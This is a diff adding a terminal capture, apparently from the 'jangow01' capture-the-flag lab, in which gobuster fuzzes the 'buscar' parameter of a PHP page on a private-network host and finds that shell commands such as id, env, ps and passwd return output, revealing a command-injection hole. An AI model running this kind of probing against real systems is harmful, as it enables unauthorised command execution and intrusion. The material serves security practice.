@@ -1,0 +1,14 @@
+┌──(kali㉿kali)-[~/Desktop/jangow01/scans]
+└─$ gobuster fuzz -w /usr/share/wordlists/dirb/big.txt -u http://10.0.0.221/site/busque.php?buscar=FUZZ -b 404 --exclude-length 1
+
+[Status=200] [Length=55]   http://10.0.0.221/site/busque.php?buscar=id
+[Status=200] [Length=58]   http://10.0.0.221/site/busque.php?buscar=ls
+[Status=200] [Length=20]   http://10.0.0.221/site/busque.php?buscar=pwd
+[Status=200] [Length=10]   http://10.0.0.221/site/busque.php?buscar=whoami
+[Status=200] [Length=30]   http://10.0.0.221/site/busque.php?buscar=date
+[Status=200] [Length=291]  http://10.0.0.221/site/busque.php?buscar=env
+[Status=200] [Length=335]  http://10.0.0.221/site/busque.php?buscar=find
+[Status=200] [Length=1030] http://10.0.0.221/site/busque.php?buscar=ps
+[Status=200] [Length=4763] http://10.0.0.221/site/busque.php?buscar=ss
+[Status=200] [Length=7293] http://10.0.0.221/site/busque.php?buscar=mysqladmin
+[Status=200] [Length=33]   http://10.0.0.221/site/busque.php?buscar=passwd
